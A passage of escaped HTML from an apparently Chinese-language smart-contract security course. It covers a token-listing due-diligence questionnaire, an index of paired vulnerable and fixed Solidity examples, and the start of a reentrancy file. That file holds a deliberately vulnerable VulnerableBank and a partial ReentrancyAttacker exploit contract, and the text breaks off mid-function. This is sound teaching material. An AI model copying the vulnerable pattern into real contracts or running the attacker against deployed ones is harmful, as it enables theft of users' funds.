否决<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>条件（如适用）<\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>评估人<\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>业务负责人确认（已接受风险）<\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>日期<\/td>\n<td><\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n"}, "t05": {"id": "t05", "file": "templates/T05-listing-dd-questionnaire.md", "title": "T05 上币尽调问卷与评分记录", "group": "tpl", "html": "<h1>T05 上币尽调问卷与评分记录<\/h1>\n<blockquote class=\"\"><p>用途：C 类评估。发给项目方填写，评估人按链上证据核验。评分用<a href=\"#lab-listing-scorecard\" data-nav=\"lab-listing-scorecard\" class=\"lab-link\">上币评分卡<\/a>。<br>配套：<a href=\"#a05\" data-nav=\"a05\">A05 上币与合作项目尽调<\/a><\/p>\n<\/blockquote>\n<h2>一、项目方问卷<\/h2>\n<h3>1. 基本信息<\/h3>\n<ul>\n<li>项目名称、官网、官方社交账号：<\/li>\n<li>代币合约地址（各链）：<\/li>\n<li>部署时间与部署者地址：<\/li>\n<li>团队成员及公开身份：<\/li>\n<\/ul>\n<h3>2. 合约与权限<\/h3>\n<ul>\n<li>合约是否可升级？升级权持有人（类型、阈值、时间锁）：<\/li>\n<li>是否可增发？增发权限与上限：<\/li>\n<li>是否可暂停 / 冻结 / 黑名单？持有人：<\/li>\n<li>owner 是否已放弃？<\/li>\n<li>是否分叉自其他项目？改动点：<\/li>\n<\/ul>\n<h3>3. 审计与安全<\/h3>\n<ul>\n<li>审计报告（审计方、版本、日期、链接）：<\/li>\n<li>审计后是否有代码改动？<\/li>\n<li>已确认但未修复的风险：<\/li>\n<li>漏洞赏金计划：<\/li>\n<\/ul>\n<h3>4. 经济模型<\/h3>\n<ul>\n<li>代币总量、分配比例、解锁曲线：<\/li>\n<li>团队与投资人锁仓合约地址及到期时间：<\/li>\n<li>流动性池、LP 锁定：<\/li>\n<li>收益来源：<\/li>\n<\/ul>\n<h3>5. 运营安全<\/h3>\n<ul>\n<li>私钥 / 多签管理方式、签名人数量与独立性：<\/li>\n<li>部署与升级流程：<\/li>\n<li>前端托管、域名、依赖保护：<\/li>\n<li>应急响应与暂停能力：<\/li>\n<li>社会工程防范措施：<\/li>\n<\/ul>\n<h2>二、评估人核验记录<\/h2>\n<h3>红线检查（任一命中 = 否决）<\/h3>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>红线<\/th>\n<th>结果<\/th>\n<th>证据<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>可无限增发且无时间锁<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>貔貅盘（分叉环境模拟买卖）<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>owner 可冻结任意地址<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>隐藏后门 / 升级后门<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>升级权为单签 EOA<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>锁仓 / 流动性锁为假<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>地址与官网/审计不一致<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>链上代码与验证源码不一致<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h3>评分摘要<\/h3>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>维度<\/th>\n<th>权重<\/th>\n<th>得分 (0–4)<\/th>\n<th>备注<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>合约权限<\/td>\n<td>30%<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>链上数据<\/td>\n<td>25%<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>团队与运营<\/td>\n<td>25%<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>经济模型<\/td>\n<td>20%<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h3>结论<\/h3>\n<p>上 / 附条件上 / 暂缓 / 否决；条件与理由：<\/p>\n"}, "examples": {"id": "examples", "file": "examples/README.md", "title": "示例合约", "group": "code", "html": "<h1>示例合约<\/h1>\n<p>每个文件同时包含 <code>// ❌ 漏洞<\/code> 版本和 <code>// ✅ 修复<\/code> 版本。全部文件不依赖外部库，使用 Solidity <code>^0.8.20<\/code>，已用 solc 0.8.24（<code>evmVersion: paris<\/code>）编译通过。<\/p>\n<blockquote class=\"warn\"><p>⚠️ 警告：示例只用于学习原理。示例中的简化实现（例如简化版 <code>mulDiv<\/code>、重入锁、初始化修饰器）不能替代 OpenZeppelin 等经过审计的库。不要部署到主网。<\/p>\n<\/blockquote>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>文件<\/th>\n<th>配套章节<\/th>\n<th>漏洞版<\/th>\n<th>修复版<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td><a href=\"#examples\" data-nav=\"examples\">01-Reentrancy.sol<\/a><\/td>\n<td><a href=\"#c03\" data-nav=\"c03\">03 重入<\/a><\/td>\n<td><code>VulnerableBank<\/code> + <code>ReentrancyAttacker<\/code><\/td>\n<td><code>SafeBank<\/code>（CEI + 共享锁）<\/td>\n<\/tr>\n<tr>\n<td><a href=\"#examples\" data-nav=\"examples\">02-AccessControl.sol<\/a><\/td>\n<td><a href=\"#c04\" data-nav=\"c04\">04 访问控制<\/a><\/td>\n<td><code>VulnerableWallet<\/code>（未保护初始化、<code>tx.origin<\/code>、任意调用、单步转移）<\/td>\n<td><code>SafeWallet<\/code><\/td>\n<\/tr>\n<tr>\n<td><a href=\"#examples\" data-nav=\"examples\">03-VaultInflation.sol<\/a><\/td>\n<td><a href=\"#c05\" data-nav=\"c05\">05 算术与精度<\/a><\/td>\n<td><code>NaiveVault<\/code><\/td>\n<td><code>OffsetVault<\/code>（虚拟份额 + 偏移 + 最小输出）<\/td>\n<\/tr>\n<tr>\n<td><a href=\"#examples\" data-nav=\"examples\">04-SpotOracle.sol<\/a><\/td>\n<td><a href=\"#c07\" data-nav=\"c07\">07 预言机<\/a><\/td>\n<td><code>SpotPriceLending<\/code><\/td>\n<td><code>FeedPriceLending<\/code>（时效、上下限、精度、L2 排序器状态）<\/td>\n<\/tr>\n<tr>\n<td><a href=\"#examples\" data-nav=\"examples\">05-SafeTokenOps.sol<\/a><\/td>\n<td><a href=\"#c06\" data-nav=\"c06\">06 外部调用<\/a>、<a href=\"#k02\" data-nav=\"k02\">C02 TRON<\/a><\/td>\n<td>—<\/td>\n<td><code>SafeTokenOps<\/code>（无代码检查、可选返回值、TRON USDT 余额差校验、按实收记账）、<code>MultiChainVault<\/code><\/td>\n<\/tr>\n<tr>\n<td><a href=\"#examples\" data-nav=\"examples\">06-SignatureReplay.sol<\/a><\/td>\n<td><a href=\"#c08\" data-nav=\"c08\">08 签名<\/a><\/td>\n<td><code>VulnerableClaim<\/code><\/td>\n<td><code>SafeClaim<\/code>（EIP-712、nonce、deadline、低 s、零地址）<\/td>\n<\/tr>\n<tr>\n<td><a href=\"#examples\" data-nav=\"examples\">07-ProxyStorage.sol<\/a><\/td>\n<td><a href=\"#c02\" data-nav=\"c02\">02<\/a>、<a href=\"#c09\" data-nav=\"c09\">09 代理<\/a><\/td>\n<td><code>NaiveProxy<\/code>、<code>BankV2Broken<\/code><\/td>\n<td><code>EIP1967Proxy<\/code>、<code>BankV2Good<\/code><\/td>\n<\/tr>\n<tr>\n<td><a href=\"#examples\" data-nav=\"examples\">08-RouterCallback.sol<\/a><\/td>\n<td><a href=\"#k00\" data-nav=\"k00\">C00 以太坊<\/a> 4.7、<a href=\"#c06\" data-nav=\"c06\">06<\/a><\/td>\n<td><code>VulnerableRouter<\/code>（用户指定池子 + 回调付款人可伪造，Sushi RouteProcessor2 模式）<\/td>\n<td><code>SafeRouter<\/code>（CREATE2 计算池子地址、付款人存于本合约、单次支付）<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h2>自己编译<\/h2>\n<div class=\"code-wrap\"><pre><code class=\"language-bash\"># 方式一：Foundry\nforge build --contracts examples/\n\n# 方式二：solc-js\nnpm i solc@0.8.24\nnpx solcjs --bin examples/01-Reentrancy.sol\n<\/code><\/pre><\/div>\n<h2>查看存储布局<\/h2>\n<div class=\"code-wrap\"><pre><code class=\"language-bash\">forge inspect BankV2Broken storage-layout\n<\/code><\/pre><\/div>\n<p>预期输出（与 <a href=\"#c09\" data-nav=\"c09\">09 章<\/a> 3.1 节表格一致）：<code>feeBps@0, owner@1, totalDeposits@2, balances@3<\/code>。<\/p>\n<h2>部署到不同链的注意事项<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>链<\/th>\n<th>注意<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>BNB Chain<\/td>\n<td>直接兼容；注意代币精度和区块计时（<a href=\"#k01\" data-nav=\"k01\">C01<\/a>）<\/td>\n<\/tr>\n<tr>\n<td>TRON<\/td>\n<td>使用 TRON 适配的编译器；<code>MultiChainVault<\/code> 部署时 <code>useBalanceCheckForPush = true<\/code>（<a href=\"#k02\" data-nav=\"k02\">C02<\/a>）<\/td>\n<\/tr>\n<tr>\n<td>Mantle<\/td>\n<td><code>payable<\/code> 收的是 MNT；<code>FeedPriceLending<\/code> 传入排序器在线状态喂价（<a href=\"#k03\" data-nav=\"k03\">C03<\/a>）<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h2>源码<\/h2>\n<h3>01-Reentrancy.sol<\/h3>\n<div class=\"code-wrap\"><pre><code class=\"language-solidity\">// SPDX-License-Identifier: MIT\n// 配套章节：03 重入攻击 ｜ 交互实验：interactive/reentrancy-lab.html\n// 仅用于学习。不要部署到主网。\npragma solidity ^0.8.20;\n\n/// @notice ❌ 漏洞版：先转账，后记账；transfer 与 withdraw 共享状态却没有锁\ncontract VulnerableBank {\n    mapping(address =&gt; uint256) public balances;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    // ❌ 漏洞：外部调用发生在状态更新之前\n    function withdraw() external {\n        uint256 amt = balances[msg.sender];\n        require(amt &gt; 0, &quot;no balance&quot;);\n        (bool ok, ) = msg.sender.call{value: amt}(&quot;&quot;);\n        require(ok, &quot;send failed&quot;);\n        balances[msg.sender] = 0;\n    }\n\n    // ❌ 跨函数重入的入口：回调中调用它，可以把&quot;尚未清零&quot;的余额转给同伙\n    function transfer(address to, uint256 amt) external {\n        require(balances[msg.sender] &gt;= amt, &quot;insufficient&quot;);\n        balances[msg.sender] -= amt;\n        balances[to] += amt;\n    }\n}\n\n/// @notice 攻击合约：演示单函数重入\ncontract ReentrancyAttacker {\n    VulnerableBank public immutable bank;\n    address public immutable owner;\n\n    constructor(VulnerableBank _bank) {\n        bank = _bank;\n        owner = msg.sender;\n    }\n\n    function attack() external payable {\n        require(msg.sender == owner, &quot;owner only&quot;);\n        bank.deposit{value: msg.value}();\n
